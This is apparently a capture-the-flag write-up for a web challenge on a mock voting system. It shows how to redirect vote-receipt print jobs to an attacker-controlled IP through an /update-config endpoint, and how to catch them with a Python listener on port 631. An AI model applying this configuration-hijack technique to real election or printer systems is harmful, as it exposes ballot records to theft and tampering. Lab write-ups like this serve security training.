# Where'd my receipt go? - web

## Challenge

In order to create a paper trail to verify the legitimacy of the digital records, a receipt is printed for every vote made. The printer can only be configured by voting officials at the polling location. Is it possible to change the printer so the vote receipts don't go where they should?

## Solve

Viewing the source code, there are `/get-config` and `/update-config` API endpoints where the printer's current configuration can be viewed / modified:

**`/get-config`:**

<img width="790" height="322" alt="getconf" src="https://github.com/user-attachments/assets/28f8d5c1-df84-4e76-b01e-45484725c534" />


The printer is currently configured to send receipts to `13.237.99.206`.

**`/update-config`:**
```py
@admin_bp.route("/update-config", methods=["POST"])
@require_polling_key
def update_polling_config():
    """
    Update polling location config. Mainly used for printer configuration.
    """
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        location_data = request.polling_location
        polling_key = location_data["key"]
        config = data.get("config")

        if config is None:
            return jsonify({"error": "Missing required field: config"}), 400

        db = Database()
        exists, location_data = db.validate_polling_key(polling_key)

        if not exists:
            return jsonify({"error": "Invalid polling key"}), 404

        # CTF Note: The config will not actually be updated. A print job will be sent to your IP instead to simulate the attack scenario. When a citizen votes, a print job will be sent to the configured printer
        # success = db.update_polling_config(polling_key, config)
        # if success:
        #     return jsonify({
        #         "success": True,
        #         "message": "Configuration updated",
        #         "config": config
        #     })
        # else:
        #     return jsonify({"error": "Failed to update configuration"}), 500

        if "printer" in config:
            send_ipp_print_job(config["printer"], 1337)

        return jsonify({
                "success": True,
                "message": "Configuration updated",
                "config": config
            })

    except Exception as e:
        return jsonify({"error": f"Failed to update configuration: {str(e)}"}), 500
```

And `send_ipp_print_job()` constricts the address we can specify for the config to IPv4 (no domain names):

```py
def send_ipp_print_job(ip, citizen_id):
    if not is_ipv4(ip):
        raise Exception("IPv4 address required for printer configuration")

    pdf_path = current_app.config["PRINT_JOB_FLAG_PDF"]
    with open(pdf_path, "rb") as f:
        pdf_data = f.read()
        ....
        ....
```

It also tells us where the flag will be sent to (port `631`):

```py
url = f"http://{ip}:631/printers/votes"
```

So, if we update the configuration to our IP address, the flag will be sent to us! Firstly we need to set up port forwarding so that when our router receives the flag from the remote server it knows to direct it towards our specific device:


- Log on to router at `192.168.0.1`
- Discover private address in VM bash terminal with `ip addr show` 
- Set up port forwarding to private IP, mapping ingress port `631` to local devices `631`

Then we set up a very basic web server to receive the response:

```py
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"Path: {self.path}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        print(f"Path: {self.path}")
        print(f"Body: {body.decode(errors='replace')}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

if __name__ == "__main__":
    server = HTTPServer(("", 631), Handler)
    print("Listening on port 631...")
    server.serve_forever()
```

```bash
python3 server.py
```

Then we send our `POST` request to `/update-config` specifying our public IP as the new config address to send receipts to:

<img width="684" height="402" alt="updateconf1" src="https://github.com/user-attachments/assets/9c069879-3957-4395-80ad-790d315b9033" />


Our server catches the request and we get the flag:

`cysea{printer_goes_brrrrr_eaecba2ab2}`
